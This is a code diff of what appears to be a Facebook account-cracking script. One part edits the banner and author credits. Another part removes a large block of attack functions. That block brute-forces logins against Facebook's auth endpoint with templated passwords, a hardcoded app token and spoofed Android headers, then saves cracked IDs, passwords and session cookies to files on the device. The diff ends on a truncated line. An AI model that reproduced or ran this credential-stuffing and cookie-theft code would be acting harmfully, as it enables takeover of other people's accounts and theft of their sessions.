@@ -283,25 +283,26 @@ def Trial(PF):
 TrialExist=""
 logo=(f"""\033[1;37m
 
-{green}
+{green}   .----------------.   .----------------. 
 | .--------------. | | .--------------. |
-| |      __      | | | | ____    ____ | |
-| |     /  \     | | | ||_   \  /   _|| |
-| |    / /\ \    | | | |  |   \/   |  | |
-| |   / ____ \   | | | |  | |\  /| |  | |
-| | _/ /    \ \_ | | | | _| |_\/_| |_ | |
-| ||____|  |____|| | | ||_____||_____|| |
+| | ____    ____ | | | |  _______     | |
+| ||_   \  /   _|| | | | |_   __ \    | |
+| |  |   \/   |  | | | |   | |__) |   | |
+| |  | |\  /| |  | | | |   |  __ /    | |
+| | _| |_\/_| |_ | | | |  _| |  \ \_  | |
+| ||_____||_____|| | | | |____| |___| | |
 | |              | | | |              | |
-| '--------------' | | '-------------- 
+| '--------------' | | '--------------' |
+ '----------------'   '----------------' 
 {green}  
 {green}  
-  {green}   
-{green}  
+  {green}      
 {green}   
+{green}  
    
 ─────────────────────────────────────────────
- {green}[{red}–{green}] FACEBOK : achraf 
- {green}[{red}–{green}] GITHUB  : achraf -AM
+ {green}[{red}–{green}] FACEBOK : A♡M
+ {green}[{red}–{green}] GITHUB  : achraf-♡
  {green}[{red}–{green}] VERSION : 0.4
  {green}[{red}–{green}] SERVICE : Free  
 ─────────────────────────────────────────────""")
@@ -776,144 +777,4 @@ def M_file_44(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\x1b[1;92m<[𝐃𝒂𝒓𝒌-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        coki="sb=shawXD01;"+coki
-                                        open('/sdcard/𝐃𝒂𝒓𝒌_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
-                                        open('/sdcard/𝐃𝒂𝒓𝒌_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                #print('\r\r\033[1;34m<[𝐃𝒂𝒓𝒌-2F]> '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\x1b[38;5;246m<[𝐃𝒂𝒓𝒌-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                                open('/sdcard/𝐃𝒂𝒓𝒌-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/𝐃𝒂𝒓𝒌-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:time.sleep(10)
-
-#------------------[  METODE 4  ]-------------------#              
-def M_file_4(ids, names, passlist):
-	try:
-		global ok, loop,  sim_id
-		boos = random.choice([P, M, H, K, B, U, O, N])
-		sys.stdout.write(f'\r\r\033[1;37m<[{boos}𝐃𝒂𝒓𝒌-M4\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)));sys.stdout.flush()
-        
-		fn = names.split(' ')[0]
-		try:
-			ln = names.split(' ')[1]
-		except:
-			ln = fn
-			
-		for pw in passlist:
-			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			adid = str(uuid.uuid4())
-			fbav = str(random.randint(200,350))+"."+str(random.randint(600,730))+"."+str(random.randint(604,690))+"."+str(random.randint(140,197))
-			fbbv = str(random.randint(111111111,999999999))
-			fbrv = str(random.randint(111111111,999999999))
-			model = device['model']
-			build = device['build']
-			fbmf = device['fbmf']
-			fbbd = device['fbbd']
-			fbdv = device['fbdv']
-			fbsv = device['fbsv']
-			#fbca = device['fbca']
-			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-			ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsv+'.1.1; '+model+' Build/'+build+') [FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=1.75,width=720,height=1529};FBLC/pt_BR;FBRV/'+fbrv+';FBCR/UNITEL;FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/com.facebook.katana;FBDV/'+model+';FBSV/'+fbsv+'.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(20000, 40000)),'X-FB-SIM-HNI':str(random.randint(20000, 40000)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'pt_BR','client_country_code':'BR','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
-			url = 'https://b-graph.facebook.com/auth/login'
-			po = requests.post(url,params=data,headers=head,allow_redirects=False).json()
-			if 'session_key' in po:
-				print('\r\x1b[1;92m<[𝐃𝒂𝒓𝒌-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-				open('/sdcard/𝐃𝒂𝒓𝒌_m4_OK.txt', 'a').write(ids + '|' + pas + '\n')
-				session = po['session_cookies']
-				cookie = ''
-				cuser = session[0]
-				cuser = session[0]['name']+'='+session[0]['value']
-				cookie+=cuser+';'
-				xs = session[1]['name']+'='+session[1]['value']
-				cookie+=xs+';'
-				fr = session[2]['name']+'='+session[2]['value']
-				cookie+=fr+';'
-				datr = session[3]['name']+'='+session[3]['value']
-				cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; '
-				pagevoice = cuser.replace('c_user','m_page_voice')
-				cookie+=pagevoice
-				#print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m " + cookie)
-				open('/sdcard/𝐃𝒂𝒓𝒌_iDs_COOKiE_M4.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
-				#token = po['access_token']
-				#requests.post('https://graph.facebook.com/'+'127103294/'+'subscribers'+'?access_token='+token)
-				oks.append(ids)
-				break
-			elif 'www.facebook.com' in po['error']['message']:
-				    if 'y' in pcp:
-					        print('\r\x1b[38;5;246m<[𝐃𝒂𝒓𝒌-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
-					        open('/sdcard/𝐃𝒂𝒓𝒌-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					        cps.append(ids)
-					        break
-				            
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	except Exception as e:
-		#print(e)
-		pass
-#------------------[  approval  ]-------------------#        
-def newkey():
-    ff = requests.get(link)
-    u = str(os.getuid())  # الحصول على UID النظام
-    pl = str(platform.platform())  # معلومات النظام
-    pl = pl.replace('.', '').replace("-", "")[::-1].upper()  # تعديل وتحويل إلى أحرف كبيرة مقلوبة
-    kk = u + pl[6:6] + platform.uname().version.replace(' ', '').replace(':', '').upper()[::-1].replace('PP', '').replace('#', '')[:12] + u
-    
-    # لا يوجد تشفير Base85 هنا
-    key = kk  # المفتاح يتم تحديده بدون تشفير
-    
-    # التحقق من البيانات المرسلة
-    if "XXFXXFXX" in ff.text:
-        if kk in ff.text:
-            if key in ff.text:
-                return 'Trial', '\033[1;91mPaid\033[1;97m'
-        else:
-            return "Trial", "\033[1;92mFree\033[1;97m"
-    
-    if ff.text == 'null':
-        return 'Napv' + kk
-    if kk in ff.text:
-        if key in ff.text:
-            return 'Apv'
-        else:
-            return 'Fuck'
-    else:
-        return 'Napv' + kk 
-    
-#####_____Unblock-Network-Ip_____#####
-try:
-    menu()
-except requests.exceptions.ConnectionError:
-        print('\n No internet connection ...')
-        exit()
-except Exception as e:
-        print(e) 
-
-#------------------[  END  ]-------------------#
-exit()
-while True: requests
-raise KeyError ("XD")
-"HaN".FuCk
-raise SystemExit
-open('').close()
+                                        print('\r\x1b[1;92m<[𝐃𝒂𝒓𝒌-OK]> ' + ids + ' | ' + pas 
